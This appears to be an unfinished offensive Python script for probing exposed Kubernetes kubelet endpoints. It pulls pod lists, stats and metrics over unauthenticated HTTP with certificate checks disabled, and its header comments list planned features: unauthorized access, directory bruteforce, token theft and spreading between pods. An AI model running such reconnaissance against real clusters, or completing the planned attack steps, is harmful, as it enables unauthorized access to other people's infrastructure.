#!/usr/bin/env python3
#!/usr/bin/python
# + Unauthorized Access
#   - external scanning module
#   - directory bruteforce
# + Curl Token
# + Access to a pod
#   - spreading access

import ssl, json, argparse
from optparse import OptionParser
import rlcompleter
from urllib.request import urlopen

usage = "usage: %prog -i 192.168.22.6"
parser = OptionParser(usage=usage)
parser.add_option("-i", dest="ripaddress", help="Remote IP address: ex. 10.22.34.67")
parser.add_option("-p", dest="rport", help="Remote Port: ex 10255, 10250")
parser.add_option("-e", dest="infopods", help="Export pod information from remote Kubernetes server via curl", action='store_true')

(options, args) = parser.parse_args()

def requestme(location):
    resp = urlopen('http://' + options.ripaddress + ':' + options.rport + '/' + location, context=checkcert)
    #cont = json.loads((resp.read()).decode('UTF-8'))
    cont = resp.read()
    print (cont)

checkcert = ssl.create_default_context()
checkcert.check_hostname = False
checkcert.verify_mode = ssl.CERT_NONE

if options.infopods is not None:
    requestme("pods")
    print ("---------------------------")
    print ("Extracting Pods via Curl  | ")
    print ("--------------------------------------------------------------------------------------->")
    requestme("pods")
    print ("--------------------------------------------------------------------------------------->")
    requestme("stats")
    requestme("stats/summary")
    requestme("stats/container")
    requestme("metrics")
    requestme("healthz")
'''
https://10.23.58.40:6443/api
https://10.23.58.40:6443/api/v1
https://10.23.58.40:6443/apis
https://10.23.58.40:6443/apis/apps
https://10.23.58.40:6443/apis/batch
https://10.23.58.40:6443/apis/extentions
https://10.23.58.40:6443/apis/policy
https://10.23.58.40:6443/version
https://10.23.58.40:6443/apis/apps/v1/proxy (500)
https://10.23.58.40:6443/apis/apps/v1/watch (500)
'''

